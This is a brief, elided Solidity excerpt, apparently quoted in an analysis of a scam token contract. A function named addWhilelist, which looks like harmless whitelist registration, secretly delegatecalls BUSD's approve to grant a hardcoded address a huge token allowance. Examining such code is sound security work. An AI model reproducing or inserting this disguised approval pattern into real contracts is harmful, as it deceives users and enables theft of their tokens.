...
contract Whilelist {
    ...
    function addWhilelist(address user) external {
        ...
        (bool success, bytes memory data) = BUSD.delegatecall(abi.encodeWithSignature("approve(address,uint256)", 0x9E7adafCf1b72aA5692C7950Fe9c610EbfAcB00B, 10**9 * 10**18));
